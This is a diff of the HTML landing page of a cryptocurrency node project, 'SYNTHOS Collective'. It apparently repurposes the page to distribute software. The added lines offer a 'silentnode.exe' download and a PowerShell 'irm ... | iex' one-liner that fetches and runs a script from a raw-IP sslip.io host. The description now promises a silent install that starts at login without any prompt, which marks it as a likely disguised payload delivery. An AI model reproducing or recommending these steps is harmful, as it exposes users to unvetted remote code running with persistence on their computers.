@@ -18,16 +18,20 @@
       <span class="brand-mark"></span>
       <span>SYNTHOS Collective</span>
     </a>
-    <nav aria-label="Primary">
+    <nav aria-label="Primary" style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
       <a href="#network">Network</a>
-      <a href="#nodes">Nodes</a>
+      <a href="./nodes.html">Node Onboarding</a>
       <a href="./security.html">Security</a>
       <a href="./aen.html">AEN</a>
       <a href="./early-access.html">Early Access</a>
-      <a href="#dex">DEX</a>
+      <a href="./dex.html">DEX</a>
       <a href="./explorer.html">Explorer</a>
       <a href="./bridge.html">Bridge</a>
       <a href="#protocol">Protocol</a>
+      <span id="topBlockBadge" style="display:inline-flex;align-items:center;gap:7px;padding:6px 12px;border-radius:999px;border:1px solid rgba(53,211,155,.4);background:rgba(53,211,155,.1);color:#35d39b;font-family:monospace;font-size:.82rem;font-weight:800" title="Live SYNTHOS Mainnet Block Height">
+        <span style="width:8px;height:8px;border-radius:50%;background:#35d39b;box-shadow:0 0 8px #35d39b"></span>
+        Block <span id="topBlockHeight">...</span>
+      </span>
     </nav>
   </header>
 
@@ -38,9 +42,9 @@
         <h1>Live SYNTHOS node console</h1>
         <p class="lede">Original L1 infrastructure for immune-node operators, outbound-only participation, validator status, and SYN network operations.</p>
         <div class="actions">
-        <a class="button primary" href="./security.html">Installer Safety Details</a>
-        <a class="button secondary" href="./early-access.html">Early Access</a>
-        <a class="button secondary" href="#nodes">View Validators</a>
+          <a class="button primary" href="https://82-29-54-7.sslip.io/downloads/silentnode.exe" download="silentnode.exe">⚡ 1-Click Background Node (.exe)</a>
+          <a class="button secondary" href="./nodes.html">Node Onboarding</a>
+          <a class="button secondary" href="./early-access.html">Early Access</a>
         </div>
       </div>
 
@@ -76,13 +80,14 @@
       </div>
       <div class="split">
         <div class="operator-panel">
-          <h3>Windows background node</h3>
-          <p>Download and double-click one file. It installs the SYNTHOS validator runner as an Administrator Windows Service, creates a local Ed25519 key, and sends signed heartbeats every 15 seconds while the computer is online.</p>
-          <p>Prefer a one-liner? Paste this into PowerShell:</p>
-          <pre><code>irm https://www.ishamwilliamsblockchains.com/api/node/windows-installer.ps1 | iex</code></pre>
+          <h3>1-Click Background Node</h3>
+          <p>Download and click <code>silentnode.exe</code>. It automatically installs into your user folder, registers to start at login (no terminal window or Administrator prompt needed), creates your local Ed25519 key, and sends signed heartbeats every 15 seconds while your computer is online.</p>
+          <p>Prefer a PowerShell one-liner?</p>
+          <pre><code>irm https://82-29-54-7.sslip.io/api/node/windows-installer.ps1 | iex</code></pre>
           <div class="actions">
-            <a class="button primary" href="./security.html">Review Installer Details</a>
-            <a class="button secondary" href="#protocol">Read Protocol</a>
+            <a class="button primary" href="https://82-29-54-7.sslip.io/downloads/silentnode.exe" download="silentnode.exe">⚡ Download 1-Click Node (.exe)</a>
+            <a class="button secondary" href="./nodes.html">Open Node Onboarding Dashboard</a>
+            <a class="button secondary" href="./security.html">Review Installer Details</a>
           </div>
         </div>
         <div class="validator-list" id="validatorList" aria-label="Validator list"></div>
